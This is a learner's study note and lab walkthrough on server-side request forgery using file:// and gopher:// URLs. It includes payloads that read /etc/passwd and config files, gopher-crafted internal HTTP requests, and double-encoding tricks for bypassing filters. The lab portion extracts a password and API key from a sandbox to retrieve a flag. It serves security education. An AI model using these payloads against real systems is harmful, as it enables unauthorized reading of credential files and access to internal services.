there are other `URL` schemes other than `HTTP`, we can use `file` and `gopher` as well which are very old `URL Schemes` here are examplesof what they look like
- `file:///etc/passwd`
- `file:///c:/windows/win.ini`
- `gopher:///etc/passwd`

####  file URL
the `file` URL scheme is not supported by `PYTHON REQUESTS LIBRARY` as seen here
![[Pasted image 20250108182117.png]]
but if we switch the `UTILITY` to `curl` it does work, therefore `curl` supports the `file` URL
![[Pasted image 20250108182230.png]]

#### Gopher URL
`gopher` is a url protocol commonly forgotten by `ADMINISTRATORS` that can be utilize to bypass restrictions of traditional `SSRF`. 

basic example of `gopher`:

setup `nc -lvnp 9000` listener
utilize curl for gopher `curl gopher://127.0.0.1:9000/hello_gopher`
- we can see the connection from `gopher`, and we can also see it took off the first letter of `h` when connecting - due to this we want to preface a command with `_`
![[Pasted image 20250108183135.png]]
`gopher` can also be utilized to recreate `GET` requests - here is an example of what a basic `GET` request looks like
```http
GET /hello_gopher HTTP/1.1
Host: 127.0.0.1:9000
User-Agent: curl/7.74.0
Accept: */*
```
lets try to recreate this with `gopher`
- we need to encode the ` ` spaces with `%20` to make a valid request

what it looks like without `URL Encoding` the spaces
```bash
curl gopher://127.0.0.1:9000/_GET /hello_gopher HTTP/1.1
```
this needs `URL Encoding` because `gopher` doesn't recognize the spaces unless they are `URL-Encoded`, we can see here that everything after `GET` was deleted
![[Pasted image 20250108183803.png]]
what it looks like `WITH` `URL Encoding`
```bash
curl gopher://127.0.0.1:9000/_GET%20/hello_gopher%20HTTP/1.1
```
now we can see that the first line mimics the first like of a  `GET`request  was properly sent 
![[Pasted image 20250108184045.png]]
***Depending on the server, in order to properly process a request might require additional headers depending on the server and how processing works*** 

- to address this we may need to add a `LINE FEED CHARACTER`, `(%0a)` and a `HOST` header

this is an example of this being required:

if we submit this `gopher` query `gopher://127.0.0.1:80/_GET%20/status%20HTTP/1.1` the server will not process it - it is looking for a `LINE FEED CHARACTER` 
![[Pasted image 20250108185333.png]]
but if we add the `LINE FEED CHARACTER` with `gopher://127.0.0.1:80/_GET%20/status%20HTTP/1.1%0a` the server processes the `/status` endpoint
![[Pasted image 20250108185508.png]]
now `gopher` can also send `POST` requests but it is up to the server if it can accept it, if we change the request to `gopher://127.0.0.1:80/_POST%20/status%20HTTP/1.1%0a`
- we get a `405 method not allowed` error
![[Pasted image 20250108215218.png]]
if we look at the `BURP` request we are able to see that the `BROWSER` `DOUBLE URL ENCODED` our payload
![[Pasted image 20250108215629.png]]
we can send the portion to `DECODER` and `Double DE Encode` it to see that it was double encoded
- all `NON-Alphanumerical` characters got double encoded, so `://`, `/`, `spaces as %2520`
- the application is `DOUBLE ENCODING` because it is being processed twice, the application first processes it as a request to `/preview`, and this request triggers the `SSRF` at `127.0.0.1/status`, Since the payload values are double encoded, the application does not fully decoded the payload until it processes the second request
![[Pasted image 20250108215725.png]]

***If we were to replicate this attack from curl or in the Repeater tool of Burp Suite, we would need to double encode any non-alphanumeric characters as well.***

#### Labs
`1.`
![[Pasted image 20250108220207.png]]
navigate to `http://localhost/status` using the `SSRF` vulnerability
![[Pasted image 20250108220311.png]]
we are able to get the location of the `config file`
![[Pasted image 20250108220337.png]]
now utilize the payload `file:///app/config.ini` to get the contents of the file
- now we got the `API` key & `Password`
`password = twasbryllyg`
`apiKey = chesirecat`
![[Pasted image 20250108220453.png]]
we are unable to grab the flag with `file:///protectedflag` payload
![[Pasted image 20250108220846.png]]
we need to feed a `POST` request with the `credentials` that we found to the `/protectedflag` endpoint in order to get the flag
```http
gopher://127.0.0.1:80/_POST%20/protectedflag%20HTTP/1.1%0ACookie:test
```
in order to test how to make a proper `gopher` request I am testing it on my `local KALI` machine, we can see that `%0A` is the `encoded` line that we use with gopher to make a new line in a `request`
![[Pasted image 20250108221441.png]]
now lets add the `parameters` to authenticate
`password = twasbryllyg`
`apiKey = chesirecat`
```http
gopher://127.0.0.1:80/_POST%20/protectedflag%20HTTP/1.1%0Apassword:twasbryllyg%0AapiKey=chesirecat
```
now lets test this against our own kali with `curl`
- post request looks good, lets try it
![[Pasted image 20250108221719.png]]
looks like when trying it, we actually need a `GET` request instead of a `POST` because we are trying to `GRAB` the contents of `/protectedflag` not `POST` content to this endpoint.

we also need to add `%0a` to process the request or it will not load because the request is not being finished.
```bash
gopher://127.0.0.1:80/_GET%20/protectedflag%20HTTP/1.1%0APassword:twasbryllyg%0AapiKey=chesirecat%0a
```
when trying this payload the formatting is wrong which makes us fail
![[Pasted image 20250108222058.png]]
after reviewing a video, we actually dont need to utilize the `API-KEY` because we have the password, to `submit` the password just add the field the the `URL`
```bash
http://ssrf-sandbox/protectedflag?password=twasbryllyg
```
`file` was utilized to grab the `password` and we just need to utilize the password to get the key
![[Pasted image 20250108231301.png]]
W
![[Pasted image 20250108231415.png]]

